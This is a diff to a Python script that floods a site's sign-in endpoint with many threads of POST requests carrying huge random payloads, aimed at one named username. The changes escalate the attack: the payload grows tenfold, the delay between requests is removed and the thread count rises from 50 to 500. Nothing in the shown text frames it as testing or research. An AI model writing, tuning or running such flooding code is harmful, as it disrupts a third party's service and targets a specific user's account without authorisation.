@@ -7,7 +7,7 @@ def generate_big_message(length):
     chars = "abcdefghijklmnopqrstuvwxyz123456789+>-*#!()"
     return ''.join(random.choice(chars) for _ in range(length))
 
-def send_requests(username, message_length=99999):
+def send_requests(username, message_length=999999):
     url = "https://middle-star.com/includes/ajax/core/signin.php"
     payload = {
         'username_email': username,
@@ -29,14 +29,14 @@ def send_requests(username, message_length=99999):
     }
     try:
         response = requests.post(url, data=payload, headers=headers, timeout=10)
-        print(response.text[:200])
+        print(response)
     except requests.exceptions.RequestException as e:
         print(f"Error: {e}")
 
 def sub_worker(username):
     while True:
         send_requests(username)
-        time.sleep(0.5)
+        #time.sleep(0.5)
 
 def worker_thread(username):
     sub_threads = []
@@ -49,7 +49,7 @@ def worker_thread(username):
 
 threads = []
 username = "ahmedjooel"
-for _ in range(50):
+for _ in range(500):
     t = threading.Thread(target=worker_thread, args=(username,))
     t.start()
     threads.append(t)
